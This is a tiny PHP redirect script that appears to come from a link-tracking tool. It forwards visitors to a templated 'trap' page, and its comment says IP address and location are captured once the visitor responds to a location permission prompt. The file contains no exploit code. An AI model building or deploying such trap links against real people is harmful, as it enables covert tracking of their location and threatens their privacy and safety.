<?php
// IP/location captured only AFTER user responds to location permission (via location-submit.php)
header('Location: forwarding_link/trap-__TPLID__.html?tid=__TRACKIFY_TID__&pf=__TRACKIFY_PF__');
exit
?>
